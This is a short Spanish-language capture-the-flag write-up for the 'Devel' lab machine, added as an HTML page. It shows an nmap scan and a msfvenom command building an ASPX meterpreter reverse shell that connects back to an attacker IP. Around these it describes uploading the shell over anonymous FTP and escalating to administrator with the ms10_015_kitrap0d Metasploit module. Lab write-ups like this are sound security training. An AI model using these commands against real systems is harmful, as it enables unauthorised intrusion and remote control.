@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Devel</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Devel</h1><br/><p>Realizo un escaneo de puertos</p><p></p><p><strong>	nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN devel_scan 10.10.10.5 </strong></p><p></p><p>Está el protocolo FTP (21) y el protocolo HTTP (80)</p><p></p><p><img src="images/125-1.png" alt="images/125-1.png" /></p><p></p><p>En el protocolo FTP tiene permitido en acceso con el usuario anonymous</p><p></p><p><img src="images/125-2.png" alt="images/125-2.png" /></p><p></p><p>Veo  que tenemos el comando PUT por lo que probablemente tengamos que subir una reverse shell <strong>Arbitrary File Upload Vulnerability</strong></p><p></p><p>Para  crear el reverse shell usaré msfvenom </p><p>	</p><p>	<strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your attacker tun0 IP4&gt; LPORT=6969 -f aspx &gt; payload.aspx</strong></p><p></p><p>Obtengo  la reverse  shell</p><p></p><p><img src="images/125-3.png" alt="images/125-3.png" /></p><p></p><p>msfconsole tiene un módulo para sugerirnos exploits</p><p></p><p><img src="images/125-4.png" alt="images/125-4.png" /></p><p></p><p>Nos da  una lista de posibles opciones</p><p></p><p><img src="images/125-5.png" alt="images/125-5.png" /></p><p></p><p>usaré este exploit</p><p></p><p>	<strong>exploit/windows/local/ms10_015_kitrap0d </strong></p><p></p><p>Ejecutamos la script y tenemos acceso como administrador</p><p></p><p><img src="images/125-6.png" alt="images/125-6.png" /></p></div>
+</body>
+</html>
